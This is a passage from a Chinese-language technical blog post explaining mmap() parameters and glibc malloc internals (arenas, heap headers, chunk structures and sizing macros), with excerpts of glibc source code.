class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line"></span><br><span class="line">（1）、addr:</span><br><span class="line">起始地址，置零让系统自行选择并返回即可.</span><br><span class="line">（2）、length:</span><br><span class="line">长度，不够一页会自动凑够一页的整数倍，我们可以宏定义#define MIN_LENGTH_MMAP 4096为一页大小</span><br><span class="line">（3）、prot:</span><br><span class="line">读写操作权限，PROT_READ可读、PROT_WRITE可写、PROT_EXEC可执行、PROT_NONE映射区域不能读取。（注意PROT_XXXXX与文件本身的权限不冲突，如果在程序中不设定任何权限，即使本身存在读写权限，该进程也不能对其操作）</span><br><span class="line">（4）、flags常用标志:</span><br><span class="line">①MAP_SHARED【share this mapping】、MAP_PRIVATE【Create a private copy-on-write mapping】</span><br><span class="line">MAP_SHARED只能设置文件共享，不能地址共享，即使设置了共享，对于两个进程来说，也不会生效。而MAP_PRIVATE则对于文件与内存都可以设置为私有。</span><br><span class="line">②MAP_ANON【Deprecated】、MAP_ANONYMOUS：匿名映射，如果映射地址需要加该参数，如果不加默认映射文件。MAP_ANON已经过时，只需使用MAP_ANONYMOUS即可</span><br><span class="line">（5）、文件描述符：fd</span><br><span class="line">（6）、文件描述符偏移量：offset</span><br><span class="line">（fd和offset对于一般性内存分配来说设置为0即可）</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line"></span><br><span class="line">失败返回MAP_FAILED，即(void * (-1))并设置errno全局变量。</span><br><span class="line">成功返回指向mmap area的指针pointer。</span><br><span class="line"></span><br><span class="line">常见errno错误：</span><br><span class="line"></span><br><span class="line">①ENOMEM：内存不足；</span><br><span class="line">②EAGAIN：文件被锁住或有太多内存被锁住；</span><br><span class="line">③EBADF：参数fd不是有效的文件描述符；</span><br><span class="line">④EACCES：存在权限错误，。如果是MAP_PRIVATE情况下文件必须可读；使用MAP_SHARED则文件必须能写入，且设置prot权限必须为PROT_WRITE。</span><br><span class="line">⑤EINVAL：参数addr、length或者offset中有不合法参数存在。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/mmap.png" alt="mmap"></p><h2 id="Glibc-malloc"><a href="#Glibc-malloc" class="headerlink" title="Glibc malloc"></a>Glibc malloc</h2><p>GNU C标准库的malloc实现源自于ptmalloc(pthreads malloc)，ptmalloc源于dlmalloc(Doug Lea malloc)。</p><p>glibc malloc通常使用两种方式分配内存，具体使用哪种方式由请求的大小和某些参数决定。一种是使用连续大段区域进行管理以提高分配效率减少浪费，通常堆区域只有一个，但glibc实现使用了多个堆区域，用来优化多线程的性能，每个区域内部称为一个arena；另一种是使用mmap，通过在请求大量内存时使用，大量指远大于一个页的大小<a href="https://www.gnu.org/software/libc/manual/html_node/The-GNU-Allocator.html">^1</a>。</p><p><code>INTERNAL_SIZE_T</code>，<code>SIZE_SZ</code>，<code>MALLOC_ALIGN_MASK</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><h3 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h3><p>Arena分为main arena和thread arena。</p><p>glibc中通过增加arena来优化对线程的支持，但并非每个线程都有一个arena，因为代价高意义不大。arena的个数由cpu核心个数所限制，限制如下。这个限制是对于thread arena。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena &#x3D; 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena &#x3D; 8 * number of cores.</span><br></pre></td></tr></table></figure><blockquote><p>例子：如果一个多线程应用(4 threads—1 main thread + 3 user thread)运行在一个单核的32位系统上。thread arena的限制即为2 * number of cores(1) = 2。在这种情况下，glibc malloc将会确保arenas在几个线程中共享使用。</p><ul><li><p>对于主线程调用malloc时，使用main arena分配空间</p></li><li><p>当线程1,2调用malloc时，创建两个新的arena分别供其使用。</p></li><li><p>当线程3调用malloc时，由于已经达到了arena的个数限制，将会复用已有的arenas(main arena，arena 1，arena 2)</p><ul><li>遍历可用的arena，一旦存在可用arena，申请该arena的锁</li><li>如果锁定成功，返回该arena</li><li>如果没有找到可用的arena，阻塞直到有可用的arena。</li></ul></li><li><p>当thread 3 调用 malloc 时(第二次了)，分配器会尝试使用其上一次使用的 arena（也即，main arena），从而尽量提高缓存命中率。当 main arena 可用时就用，否则 thread 3 就一直阻塞，直至 main arena 空闲。因此现在 main arena 实际上是被 main thread 和 thread 3 所共享。</p></li></ul></blockquote><h3 id="Multiple-heaps"><a href="#Multiple-heaps" class="headerlink" title="Multiple heaps"></a>Multiple heaps</h3><p>在「glibc malloc」中主要有 3 种数据结构：</p><ul><li><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1671">malloc_state</a> ——Arena header—— 一个 thread arena 可以维护多个堆，这些堆另外共享同一个 arena header。Arena header 描述的信息包括：bins、top chunk、last remainder chunk 等；由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>__libc_lock_define(, mutex);</p><p>该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</p></li><li><p>flags</p><p>flags 记录了分配区的一些标志，比如 bit0 记录了分配区是否有 fast bin chunk ，bit1 标识分配区是否能返回连续的虚拟地址空间。具体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br></pre></td></tr></table></figure></li><li><p>binmap</p><p>ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk 。</p></li></ul></li><li><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L59">heap_info</a> ——Heap Header—— 一个 thread arena 可以维护多个堆。每个堆都有自己的堆 Header（注：也即头部元数据）。什么时候 Thread Arena 会维护多个堆呢？ 一般情况下，每个 thread arena 都只维护一个堆，但是当这个堆的空间耗尽时，新的堆（而非连续内存区域）就会被 <code>mmap</code> 到这个 aerna 里；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span></span><br><span class="line"><span class="comment">   that are dynamically created for multi-threaded programs.  The</span></span><br><span class="line"><span class="comment">   maximum size must be a power of two, for fast determination of</span></span><br><span class="line"><span class="comment">   which heap belongs to a chunk.  It should be much larger than the</span></span><br><span class="line"><span class="comment">   mmap threshold, so that requests with a size just below that</span></span><br><span class="line"><span class="comment">   threshold can be fulfilled without creating too many heaps.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><p><strong>疑问</strong> 负数</p></li><li><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1108">malloc_chunk</a> ——Chunk header—— 根据用户请求，每个堆被分为若干 chunk。每个 chunk 都有自己的 chunk header。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：</p><ul><li>Main arena 无需维护多个堆，因此也无需 heap_info。当空间耗尽时，与 thread arena 不同，main arena 可以通过 <code>sbrk</code> 拓展<strong>堆</strong>段，直至堆段「碰」到内存映射段；</li><li>与 thread arena 不同，main arena 的 arena header 不是保存在通过 <code>sbrk</code> 申请的堆段里，而是作为一个全局变量，可以在 libc.so 的数据段中找到</li></ul></blockquote><p>main arena和thread arena的图示（单堆）</p><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/mainthreadarena.png"></p><p>thread arena图示(多堆)</p><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/thread%20arena.png"></p><h3 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h3><p>堆段中存在的 chunk 类型如下：</p><ul><li>Allocated chunk;</li><li>Free chunk;</li><li>Top chunk;</li><li>Last Remainder chunk.</li></ul><h4 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h4><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/Allocated%20chunk.png"></p><p>图中结构体内部各字段的含义依次为：</p><ul><li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1110">prev_size</a>：若前一个 chunk 可用，则此字段赋值为前一个 chunk 的大小；否则，此字段被用来存储前一个 chunk 的用户数据；</li><li>size：此字段赋值本 chunk 的大小，*<em>大小必须是 2 * SIZE_SZ 的整数倍*</em>，其最后三位包含标志信息：<ul><li>PREV_INUSE (P) – 置「1」表示前个 chunk 被分配；</li><li>IS_MMAPPED (M) – 置「1」表示这个 chunk 是通过 <code>mmap</code> 申请的（较大的内存）；</li><li>NON_MAIN_ARENA (N) – 置「1」表示这个 chunk 属于一个 thread arena(mmapd’d memory)。</li></ul></li></ul><blockquote><p><strong>注意</strong>：</p><ul><li>malloc_chunk 中的其余结构成员，如 fd、 bk，如果该块已分配，则不会使用，用来存储用户数据；</li><li>用户请求的大小被转换为内部实际大小，因为需要额外空间存储 malloc_chunk，此外还需要考虑对齐。</li></ul></blockquote><h4 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h4><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/freechunk.png"></p><p>图中结构体内部各字段的含义依次为：</p><ul><li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1110">prev_size</a>: 两个相邻 free chunk 会被合并成一个，因此该字段总是保存前一个 allocated chunk 的用户数据；</li><li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1111">size</a>: 该字段保存本 free chunk 的大小；</li><li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1113">fd</a>: Forward pointer —— 本字段指向同一 bin 中的下个 free chunk；</li><li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1114">bk</a>: Backward pointer —— 本字段指向同一 bin 中的上个 free chunk</li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，按照由大到小的顺序排列，不过其用于较大的 chunk（large chunk）。</li></ul><h4 id="Chunk相关的宏"><a href="#Chunk相关的宏" class="headerlink" title="Chunk相关的宏"></a><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk">Chunk相关的宏</a></h4><p><strong>chunk 与 mem 指针头部的转换</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span></span><br></pre></td></tr></table></figure><p><strong>最小的 chunk 大小</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure><p><strong>最小申请的堆内存大小</strong></p><p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p><p><em>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span><br><span class="line">                      ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure><p><strong>检查分配给用户的内存是否对齐</strong></p><p>2 * SIZE_SZ 大小对齐。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line">    ((<span class="keyword">uintptr_t</span>)(MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="line">     MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p><strong>请求字节数判断</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br></pre></td></tr></table></figure><p><strong>将用户请求内存大小转为实际分配内存大小</strong></p><p>由于 chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure><h3 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h3><p>「<strong>bins</strong>」 就是空闲列表数据结构。它们用以保存 free chunks。根据其中 chunk 